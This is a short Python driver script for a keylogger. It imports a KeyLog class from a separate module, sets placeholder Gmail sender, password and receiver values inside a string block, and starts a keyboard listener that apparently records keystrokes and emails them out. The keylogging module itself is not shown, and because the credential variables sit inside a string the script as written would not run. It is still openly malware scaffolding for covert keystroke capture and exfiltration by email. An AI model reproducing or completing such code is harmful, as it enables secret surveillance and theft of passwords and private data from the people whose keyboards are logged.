import os
import sys
import time

from key_logger import KeyLog

'''
sender_email = "your_email@gmail.com"
sender_password = "your_password"
receiver_email = "receiving_email@gmail.com"
'''

def main():
    logger = KeyLog(sender_email, sender_password, receiver_email, "")
    logger.keyboardListener()

if __name__ == "__main__":
    main()
